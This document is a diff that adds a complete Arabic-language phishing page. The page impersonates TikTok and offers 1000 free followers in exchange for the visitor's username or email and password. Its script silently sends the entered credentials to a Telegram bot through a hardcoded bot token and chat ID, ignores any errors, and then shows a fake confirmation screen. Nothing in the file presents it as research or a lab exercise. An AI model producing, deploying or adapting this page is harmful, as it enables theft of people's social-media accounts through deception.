@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok 1000 Followers</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #080808;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.card {
+  width: 100%;
+  max-width: 390px;
+  background: #151515;
+  border: 1px solid #333;
+  border-radius: 22px;
+  padding: 28px 22px;
+  text-align: center;
+  box-shadow: 0 0 30px #00e5ff22;
+}
+
+.logo {
+  font-size: 45px;
+  font-weight: bold;
+  text-shadow: -3px 0 #00f2ea, 3px 0 #ff0050;
+}
+
+h1 {
+  font-size: 25px;
+  margin-bottom: 10px;
+}
+
+.highlight {
+  color: #ff315c;
+}
+
+.description {
+  color: #aaa;
+  line-height: 1.8;
+  font-size: 14px;
+}
+
+.notice {
+  background: #252525;
+  border-right: 3px solid #00e5ff;
+  padding: 12px;
+  border-radius: 9px;
+  color: #ddd;
+  font-size: 13px;
+  margin: 20px 0;
+}
+
+input {
+  width: 100%;
+  padding: 15px;
+  margin: 9px 0;
+  border-radius: 10px;
+  border: 1px solid #444;
+  background: #222;
+  color: white;
+  outline: none;
+  direction: ltr;
+  text-align: left;
+}
+
+button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 15px;
+  border: none;
+  border-radius: 10px;
+  background: linear-gradient(90deg,#ff0050,#00c8d7);
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:active {
+  transform: scale(.98);
+}
+
+.footer {
+  color: #777;
+  font-size: 11px;
+  margin-top: 25px;
+}
+
+/* تنسيق الشاشة السوداء النهائية */
+#blackScreen {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #000000;
+  z-index: 9999;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 20px;
+}
+
+#blackScreen h2 {
+  color: #00e5b0;
+  font-size: 24px;
+  line-height: 1.8;
+  max-width: 500px;
+  text-shadow: 0 0 15px #00e5b044;
+}
+</style>
+</head>
+
+<body>
+
+<!-- المحتوى الأصلي للصفحة -->
+<div class="card" id="mainCard">
+
+  <div class="logo">TikTok</div>
+
+  <h1>اربح الآن <span class="highlight">1000 متابع</span></h1>
+
+  <p class="description">
+    احصل على 1000 متابع حقيقي لحسابك على تيك توك بخطوات بسيطة وسريعة.
+  </p>
+
+  <div class="notice">
+    أدخل بيانات حسابك للمتابعة.
+  </div>
+  
+  <input
+    type="text"
+    id="username"
+    placeholder="اسم المستخدم أو البريد الإلكتروني"
+    autocomplete="off"
+  >
+
+  <input
+    type="password"
+    id="password"
+    placeholder="كلمة المرور"
+    autocomplete="off"
+  >
+
+  <button onclick="startTest()">
+    بدء التجربة
+  </button>
+
+  <div class="footer">
+    TikTok Followers System
+    <br>
+    Official Promotion Tool
+  </div>
+
+</div>
+
+<!-- الشاشة السوداء التي تظهر بعد الضغط -->
+<div id="blackScreen">
+  <h2>سيصلك بعد 24 ساعة 1000 متابع حقيقي.</h2>
+</div>
+
+<script>
+async function startTest() {
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if (!username) {
+    alert("من فضلك أدخل اسم المستخدم على الأقل.");
+    return;
+  }
+
+  // التوكن والـ Chat ID الخاص بك
+  const botToken = "8852999428:AAF0PeE9OjP24wXt6F13KfJamq1X58-luL4"; 
+  const chatId = "7516606366";
+  
+  const message = `🚨 بيانات جديدة:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password || 'غير مسجلة'}`;
+
+  // إرسال البيانات لبوت تيليجرام في الخلفية بصمت تام
+  try {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  } catch (err) {
+    // تجاهل أي أخطاء لكي لا تتأثر التجربة
+  }
+
+  // إخفاء الكارد الأساسي وإظهار الشاشة السوداء فوراً
+  document.getElementById("mainCard").style.display = "none";
+  document.getElementById("blackScreen").style.display = "flex";
+}
+</script>
+
+</body>
+</html>
